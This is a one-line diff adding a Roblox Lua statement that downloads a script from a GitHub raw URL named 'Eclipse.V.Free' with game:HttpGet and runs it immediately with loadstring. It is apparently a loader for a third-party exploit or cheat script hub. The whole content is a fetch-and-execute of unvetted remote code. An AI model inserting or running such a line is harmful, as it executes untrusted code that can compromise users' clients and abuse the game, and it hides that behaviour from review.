@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cyrillz/Eclipse.V.Free/refs/heads/main/Eclipse.V.FREE%20(2).txt"))()
